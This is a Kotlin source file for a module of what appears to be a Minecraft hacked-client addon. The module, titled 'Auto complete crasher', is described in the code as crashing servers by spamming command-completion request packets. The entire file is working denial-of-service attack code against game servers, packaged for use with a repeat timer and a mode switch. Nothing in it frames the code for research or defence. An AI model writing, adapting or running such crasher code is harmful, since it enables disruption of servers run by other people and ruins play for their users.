package su.mandora.tarasande_crasher.module

import su.mandora.tarasande_crasher.forcePacket
import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket
import su.mandora.tarasande.event.impl.EventDisconnect
import su.mandora.tarasande.event.impl.EventUpdate
import su.mandora.tarasande.system.base.valuesystem.impl.ValueBoolean
import su.mandora.tarasande.system.base.valuesystem.impl.ValueMode
import su.mandora.tarasande.system.base.valuesystem.impl.ValueNumber
import su.mandora.tarasande.system.feature.modulesystem.Module
import su.mandora.tarasande.util.math.TimeUtil

class ModuleAutoCompleteCrasher : Module("Auto complete crasher", "Crashes the server by spamming auto completions", "Crasher") {
    private val playerCompletion = RequestCommandCompletionsC2SPacket(0, " ")
    private val commandCompletion = RequestCommandCompletionsC2SPacket(0, "/")

    private val mode = ValueMode(this, "Mode", true, "Players", "Commands")

    private val repeat = ValueBoolean(this, "Repeat", false)
    private val repeatDelay = ValueNumber(this, "Repeat delay", 500.0, 1000.0, 50000.0, 500.0, isEnabled = { repeat.value })

    private val timer = TimeUtil()

    init {
        registerEvent(EventDisconnect::class.java) {
            switchState()
        }
        registerEvent(EventUpdate::class.java) {
            if (repeat.value) {
                if (timer.hasReached(repeatDelay.value.toLong())) {
                    execute()
                    timer.reset()
                }
            }
        }
    }

    override fun onEnable() {
        super.onEnable()
        if (!repeat.value) execute()
    }

    private fun execute() {
        if (mode.isSelected(0)) forcePacket(playerCompletion)
        if (mode.isSelected(1)) forcePacket(commandCompletion)
    }
}
